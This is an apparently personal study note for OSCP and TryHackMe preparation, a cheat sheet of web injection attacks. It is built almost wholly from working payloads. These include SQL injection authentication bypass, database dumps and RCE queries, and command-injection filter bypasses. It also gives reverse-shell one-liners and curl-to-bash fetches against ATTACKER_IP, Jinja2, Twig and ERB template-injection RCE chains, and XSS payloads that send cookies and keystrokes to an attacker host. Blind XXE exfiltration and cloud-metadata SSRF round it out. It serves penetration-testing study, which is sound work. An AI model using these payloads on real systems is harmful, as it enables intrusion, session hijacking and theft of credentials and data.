---
tags: [oscp-journey, thm, sqli, xss, command-injection, ssti, xxe, injection, web-attacks]
module: 1
cert-stage: thm
difficulty: beginner
---

# S1-11 — Web Attacks: Injection Deep Dive

## What Injection Attacks Are

Injection vulnerabilities occur when untrusted user input is incorporated into a query, command, or template without proper sanitisation or parameterisation. The interpreter — SQL database, OS shell, template engine, XML parser — executes the attacker's input as code rather than data.

Injection is OWASP A03:2021 and has been in the top three since the list began. It covers SQL injection, command injection, SSTI, XSS, and more.

This note covers each type at the depth needed for THM rooms and HTB Easy/Medium machines.

---

## SQL Injection

### How It Works

A vulnerable query:

    SELECT * FROM users WHERE username='INPUT' AND password='INPUT';

Attacker supplies: `admin' -- -`

Query becomes:

    SELECT * FROM users WHERE username='admin' -- -' AND password='anything';
    # Everything after -- - is a comment → password check bypassed

### Detection — Finding SQLi

Test every input field and URL parameter:

    '                    → syntax error = SQLi possible
    ''                   → escaped quote = possibly safe
    `                    → syntax error in MySQL
    admin'-- -           → comment out rest of query
    ' OR 1=1-- -         → always true
    ' OR '1'='1          → always true (no comment needed)
    " OR "1"="1          → double-quote variation
    1' ORDER BY 1-- -    → order by column number (increases until error = column count)
    1' ORDER BY 5-- -    → error means fewer than 5 columns

### Authentication Bypass

    # Username field
    admin'-- -
    admin' #
    ' OR 1=1-- -
    ' OR 'x'='x
    anything' OR 1=1-- -

    # Username + Password both controlled
    ' OR 1=1-- -    (in username, anything in password)

### UNION-Based SQLi

UNION allows appending results from another SELECT. Requires knowing the number of columns and a visible output location.

    # Step 1 — Find number of columns
    ' ORDER BY 1-- -    → no error
    ' ORDER BY 2-- -    → no error
    ' ORDER BY 3-- -    → ERROR: table has 2 columns

    # Step 2 — Find which columns are displayed (string visible in page)
    ' UNION SELECT NULL,NULL-- -
    ' UNION SELECT 'a',NULL-- -   → if 'a' appears in page → column 1 is visible
    ' UNION SELECT NULL,'a'-- -   → if 'a' appears in page → column 2 is visible

    # Step 3 — Extract data
    ' UNION SELECT username,password FROM users-- -
    ' UNION SELECT table_name,NULL FROM information_schema.tables-- -
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

    # Full database dump
    ' UNION SELECT group_concat(username,':',password SEPARATOR '\n'),NULL FROM users-- -

### Error-Based SQLi (MySQL)

When UNION is not usable but errors are shown:

    ' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
    ' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -

### Blind SQLi — Boolean Based

When there is no visible output but page behaviour changes:

    # True condition (normal response)
    ' AND 1=1-- -
    ' AND 'a'='a'-- -

    # False condition (different response — empty, error, redirect)
    ' AND 1=2-- -
    ' AND 'a'='b'-- -

    # Extract data one character at a time
    ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
    ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'-- -
    # Continue until full password extracted

    # Automate with sqlmap
    sqlmap -u "http://TARGET/page?id=1" --level=3 --risk=2 --dbs

### Blind SQLi — Time Based

When there is no page behaviour change at all:

    # MySQL — if true, sleep 5 seconds
    ' AND SLEEP(5)-- -
    ' AND IF(1=1,SLEEP(5),0)-- -

    # Extract data with time delay
    ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)-- -

    # PostgreSQL equivalent
    '; SELECT pg_sleep(5)-- -
    ' AND 1=(SELECT 1 FROM pg_sleep(5))-- -

    # MSSQL equivalent
    '; WAITFOR DELAY '0:0:5'-- -

    # Automate
    sqlmap -u "http://TARGET/page?id=1" --technique=T --dbs

### sqlmap — Automated SQLi

    # Basic detection
    sqlmap -u "http://TARGET/page?id=1" --dbs

    # POST request
    sqlmap -u "http://TARGET/login" --data "username=admin&password=test" --dbs

    # With session cookie (authenticated)
    sqlmap -u "http://TARGET/profile?id=1" --cookie "session=ABC123" --dbs

    # Dump specific table
    sqlmap -u "http://TARGET/page?id=1" -D database_name -T users --dump

    # Try to get OS shell (if FILE privileges and writable web root)
    sqlmap -u "http://TARGET/page?id=1" --os-shell

    # Specify injection point with asterisk
    sqlmap -u "http://TARGET/page?id=1*" --dbs

    # Increase aggressiveness
    sqlmap -u "http://TARGET/page?id=1" --level=5 --risk=3 --dbs

    # Batch mode (no prompts)
    sqlmap -u "http://TARGET/page?id=1" --dbs --batch

    # Tamper scripts (bypass WAF)
    sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment --dbs

### SQLi in Different Databases

    # MySQL / MariaDB
    ' UNION SELECT @@version,NULL-- -
    ' UNION SELECT user(),NULL-- -
    ' UNION SELECT database(),NULL-- -
    ' UNION SELECT load_file('/etc/passwd'),NULL-- -   # read files (if FILE priv)
    ' INTO OUTFILE '/var/www/html/shell.php'-- -       # write shell (if writable)

    # PostgreSQL
    ' UNION SELECT version(),NULL-- -
    ' UNION SELECT current_user,NULL-- -
    '; COPY (SELECT '') TO PROGRAM 'id'-- -            # RCE via COPY TO PROGRAM

    # MSSQL
    ' UNION SELECT @@version,NULL-- -
    '; EXEC xp_cmdshell('id')-- -                      # RCE (if xp_cmdshell enabled)
    '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -

    # SQLite
    ' UNION SELECT sqlite_version(),NULL-- -
    ' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -

---

## Command Injection

### How It Works

Vulnerable PHP:

    $output = shell_exec('ping -c 1 ' . $_GET['ip']);

Attacker supplies: `127.0.0.1; id`

Command becomes: `ping -c 1 127.0.0.1; id` — runs both commands.

### Detection

Test in any field that might feed a system command (IP address fields, filename inputs, domain lookup, traceroute, DNS lookup features):

    ; id
    | id
    || id
    & id
    && id
    `id`
    $(id)
    %0a id           # newline separator
    ;id;

### Confirm OOB (Out-of-Band) When Output is Blind

    # Start tcpdump on attacker
    sudo tcpdump -i tun0 icmp -v

    # Test ICMP
    ; ping -c 1 ATTACKER_IP
    | ping -c 1 ATTACKER_IP
    $(ping -c 1 ATTACKER_IP)

    # If ping received → blind command injection confirmed
    # Now escalate to reverse shell

### Operators — When to Use Which

    ;          → runs command regardless of previous exit code
    |          → pipes stdout of first to stdin of second
    ||         → runs second command only if first FAILS
    &          → runs first command in background, runs second
    &&         → runs second command only if first SUCCEEDS
    \n / %0a   → newline separator (useful when ; and | are filtered)
    `cmd`      → command substitution — output inserted into string

### Filter Bypasses

    # Space filter bypass
    {cat,/etc/passwd}         # no spaces — IFS separator
    cat${IFS}/etc/passwd      # IFS is internal field separator (space/tab/newline)
    cat</etc/passwd           # redirect as space replacement
    X=$'cat\x20/etc/passwd'&&$X   # hex encoding

    # Slash filter bypass
    cat ${HOME:0:1}etc${HOME:0:1}passwd   # ${HOME:0:1} = /

    # Keyword filter bypass
    c'a't /etc/passwd         # quoted chars not filtered
    ca""t /etc/passwd         # empty string breaks keyword detection
    \c\a\t /etc/passwd        # backslash escape

    # Encoding bypass
    echo "aWQ=" | base64 -d | bash     # base64 decode: id
    echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

### Command Injection to Reverse Shell

    # Once blind injection confirmed:
    ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
    ; curl http://ATTACKER_IP/shell.sh | bash

---

## Server-Side Template Injection (SSTI)

### How It Works

Web frameworks use templating engines (Jinja2, Twig, Mako, Freemarker) to render dynamic HTML. If user input is embedded directly into a template string rather than passed as a variable, the template engine evaluates it.

Vulnerable Jinja2 (Python/Flask):

    template = "Hello " + request.args.get('name')
    return render_template_string(template)

Attacker supplies: `{{7*7}}` → page renders `Hello 49` → SSTI confirmed.

### Detection — Test All Template Engines at Once

    {{7*7}}          → Jinja2/Twig: renders 49
    ${7*7}           → Freemarker/Mako: renders 49
    <%= 7*7 %>       → ERB (Ruby): renders 49
    #{7*7}           → Ruby
    *{7*7}           → Thymeleaf (Java): renders 49
    {{7*'7'}}        → Jinja2: renders 7777777  /  Twig: renders 49

If any of these renders the evaluated result in the page → SSTI confirmed.

### Jinja2 (Python/Flask) — RCE

    # Read files
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

    # Shorter — access os module through config
    {{config['SECRET_KEY']}}   # read Flask secret key (often present)

    # Command execution — find Python classes chain
    {{''.__class__.__mro__[1].__subclasses__()}}
    # Look for index of subprocess.Popen or os._wrap_close in the list

    # Once you find the index (varies per app — try 258, 259, 260 area):
    {{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()}}

    # Cleaner one-liner (works on many Flask apps):
    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

    # Reverse shell
    {{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}

### Twig (PHP/Symfony) — RCE

    # Confirm
    {{7*7}}   → 49

    # Command execution
    {{['id']|filter('system')}}
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

    # Read files
    {{'/etc/passwd'|file_excerpt(1,10)}}

### Freemarker (Java) — RCE

    # Confirm: ${7*7} → 49
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

### ERB (Ruby on Rails) — RCE

    # Confirm: <%= 7*7 %> → 49
    <%= `id` %>
    <%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") %>

### Using tplmap for Automated SSTI

    git clone https://github.com/epinna/tplmap
    python3 tplmap.py -u "http://TARGET/page?name=*"
    python3 tplmap.py -u "http://TARGET/page?name=*" --os-shell

---

## Cross-Site Scripting (XSS)

XSS injects JavaScript into pages viewed by other users. Three types:

    Reflected XSS   → payload in request, reflected immediately in response
    Stored XSS      → payload stored in database, executed when others view it
    DOM XSS         → payload processed by client-side JS without going to server

### Detection

Test in all input fields, URL parameters, headers, and anywhere reflected in the page:

    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    "'><script>alert(1)</script>
    javascript:alert(1)
    <iframe src="javascript:alert(1)">

### Filter Bypass

    # If <script> is filtered:
    <ScRiPt>alert(1)</ScRiPt>            # case variation
    <img src=x onerror=alert(1)>          # event handler
    <svg/onload=alert(1)>                 # no space
    <body onload=alert(1)>
    <details open ontoggle=alert(1)>
    <input onfocus=alert(1) autofocus>

    # If quotes are filtered:
    <img src=x onerror=alert(1)>          # no quotes needed
    <svg onload=alert`1`>                 # backtick instead of parens

    # If parentheses are filtered:
    <svg onload=alert`1`>
    <img src=x onerror="window['alert'](1)">

    # HTML encoding bypass
    &lt;script&gt;alert(1)&lt;/script&gt;

### Useful XSS Payloads

    # Cookie theft — sends victim's cookies to attacker
    <script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
    <img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">

    # Keylogger
    <script>document.onkeypress=function(e){fetch('http://ATTACKER_IP/?k='+e.key)}</script>

    # Redirect
    <script>window.location='http://ATTACKER_IP/phishing'</script>

    # BeEF hook (browser exploitation framework)
    <script src="http://ATTACKER_IP:3000/hook.js"></script>

### Catching Stolen Cookies

    # Simple HTTP listener on attacker
    nc -lvnp 80
    # OR
    python3 -m http.server 80
    # Then watch the access log for incoming requests with cookie data

    # Use stolen session cookie in Burp
    # Replace your cookie with victim's cookie → hijack their session

---

## XXE (XML External Entity)

XXE occurs when an XML parser processes external entity references. Allows reading local files and sometimes SSRF.

### Detection

Look for XML input — SOAP endpoints, file uploads (SVG, DOCX), API requests with Content-Type: application/xml.

Send a test entity:

    <?xml version="1.0"?>
    <!DOCTYPE test [<!ENTITY xxe "test">]>
    <root>&xxe;</root>
    # If "test" appears in the response → entity expansion works → XXE possible

### Reading Local Files

    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>&xxe;</root>

    # Windows
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
    <root>&xxe;</root>

### Blind XXE — OOB Exfiltration

When file contents are not reflected in the response:

    # Host a malicious DTD on attacker
    cat > /tmp/evil.dtd << 'EOF'
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
    %eval;
    %exfiltrate;
    EOF
    python3 -m http.server 80

    # Send payload to target
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd"> %xxe;]>
    <root></root>

    # File contents arrive at your http.server as URL parameters

### XXE to SSRF

    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
    <root>&xxe;</root>
    # Reaches AWS metadata endpoint from the server → credential theft

---

## Injection Quick Reference

    # SQLi — auth bypass
    ' OR 1=1-- -

    # SQLi — UNION column count
    ' ORDER BY N-- -    (increment N until error)

    # SQLi — UNION data extraction
    ' UNION SELECT username,password FROM users-- -

    # SQLi — blind time-based
    ' AND SLEEP(5)-- -

    # sqlmap
    sqlmap -u "http://TARGET/page?id=1" --dbs --batch
    sqlmap -u "http://TARGET/login" --data "user=a&pass=b" --dbs --batch

    # Command injection
    ; id
    | id
    $(id)
    `id`

    # Command injection OOB confirmation
    ; ping -c 1 ATTACKER_IP   (watch: sudo tcpdump -i tun0 icmp)

    # SSTI detection
    {{7*7}}    ${7*7}    <%= 7*7 %>

    # SSTI — Jinja2 RCE
    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

    # XSS — basic
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>

    # XSS — cookie theft
    <script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>

    # XXE — file read
    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

| Injection Type | Where to Look | Confirming Payload |
|---|---|---|
| SQLi | Login forms, URL ?id=, search boxes | ' causes error or ' OR 1=1-- - changes response |
| Command injection | IP fields, ping/traceroute, filename inputs | ; ping -c 1 ATTACKER_IP (check tcpdump) |
| SSTI | Name fields, search, greeting pages | {{7*7}} renders 49 |
| XSS | All reflected inputs, comments, profile | alert(1) fires |
| XXE | XML API endpoints, SVG upload, SOAP | File contents returned |
| LFI | page=, file=, view= parameters | ../../../../etc/passwd returns contents |

---

## Related Notes
- S1-08 — Shell Techniques
- S1-10 — Web Attacks: File Uploads and LFI
- PHANTOM/02.2 — Injection Attacks
- PHANTOM/02.1 — OWASP Top 10 and Burp Suite
- PHANTOM/02.5 — Advanced Web Attacks and API Testing
- S4-02 — Linux Easy Machine Methodology
